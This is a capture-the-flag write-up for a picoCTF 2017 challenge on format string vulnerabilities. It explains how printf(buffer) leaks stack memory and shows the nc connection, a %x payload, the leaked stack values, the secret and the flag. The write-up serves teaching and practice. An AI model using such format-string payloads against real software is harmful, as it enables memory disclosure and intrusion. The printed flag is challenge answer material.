# Introduction
* Format string vulnerabilities happen because a programmer forgets to use the format string on one of the `printf` family functions
* Since the `printf` format strings take parameters from the stack, we can read data from the stack by passing in unwanted format parameters. For more information about format string parameters, see [here](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwjprL2Due7UAhVMGz4KHeK8AMMQFggoMAA&url=http%3A%2F%2Fen.cppreference.com%2Fw%2Fcpp%2Fio%2Fc%2Ffprintf&usg=AFQjCNFTJnlM5_BFKCc0x9WLmlAuh1fGhQ) or use the man page for `printf`

# Solution
* From the C source, we can see that printf is called without a format string: `printf(buffer);` (line 24). This hints that FSB might be possible.
* The easiest way to solve this problem is to use a series of `%x` modifiers and make an educated guess on which output was correct. We know that it will be 4 bytes since we are reading up to `sizeof(int)`. (line 16). We also know things that start with f are probably in the stack, and the 804... address is probably a place in `.text`
	* > `nc shell2017.picoctf.com 42684`
	* Give me something to say!
	* %x.%x.%x.%x.%x.%x.%x.%x.%x.
	* 40.f7fc7c20.8048792.1.ffffdd34.90ba6e5.3.f7fc73c4.ffffdca0.
	* Now tell my secret in hex! Secret: 90ba6e5
	* 65aaf5d76d7fa708642cf1ab573ebf58
	* Wow, you got it!
